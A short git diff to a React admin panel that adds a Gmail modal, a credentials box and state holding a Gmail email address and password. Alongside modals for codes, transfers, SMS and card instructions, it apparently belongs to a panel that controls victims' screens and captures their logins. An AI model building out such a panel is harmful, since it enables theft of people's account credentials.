@@ -11,6 +11,8 @@ import UserManagement from '@/components/admin/UserManagement';
 import RegisteredUsersManagement from '@/components/admin/RegisteredUsersManagement';
 import SmsManagement from '@/components/admin/SmsManagement';
 import { ProtectModal, TransferModal, CancelModal, CodeModal, MessageModal, SmsCompraModal, CardInstructionsModal } from '@/components/admin/Modals';
+import { GmailModal } from '@/components/admin/GmailModal';
+import GmailCredentialsBox from '@/components/admin/GmailCredentialsBox';
 import { Session, ScreenType } from '@shared/schema';
 import { Button } from '@/components/ui/button';
 import { Dialog, DialogContent, DialogDescription, DialogFooter, DialogHeader, DialogTitle } from "@/components/ui/dialog";
@@ -111,6 +113,10 @@ export default function AdminPanel() {
   const [smsPhoneNumber, setSmsPhoneNumber] = useState('');
   const [smsMessage, setSmsMessage] = useState('');
   const [isSendingSms, setIsSendingSms] = useState(false);
+  
+  // Estados para Gmail
+  const [isGmailModalOpen, setIsGmailModalOpen] = useState(false);
+  const [gmailCredentials, setGmailCredentials] = useState<{correo?: string; contrasena?: string}>({});
 
   // Determinar si es un usuario regular o administrador
   const isAdmin = user?.role === 'admin';
